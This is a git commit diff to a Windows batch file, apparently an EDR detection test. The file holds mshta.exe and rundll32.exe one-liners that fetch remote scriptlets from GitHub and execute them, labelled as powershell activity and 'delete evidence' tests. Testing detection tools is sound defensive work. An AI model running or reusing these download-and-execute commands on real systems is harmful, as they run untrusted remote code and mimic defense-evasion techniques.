fd12a0a2315e123ed7a66ba55287fc9ed3eb34f5
harasay <114565656+harasay@users.noreply.github.com>
2023-03-03 17:06:53 +0900

    Update edrtest2-POV.bat

--- edrtest2-POV.bat
+++ edrtest2-POV.bat
@@ -1,1 +1,2 @@
-echo EDR test powershell activitymshta.exe javascript:a=(GetObject("script:https://github.com/srmstest/testdetection/blob/main/edrtest2-POV.bat")).Exec();close()timeout 5echo EDR test delete evidencerundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://github.com/srmstest/testdetection/blob/main/edrtest3-POV")
+echo EDR test powershell activitymshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/srmstest/testdetection/main/edrtest2-POV.bat
+")).Exec();close()timeout 5echo EDR test delete evidencerundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/srmstest/testdetection/main/edrtest3-POV")
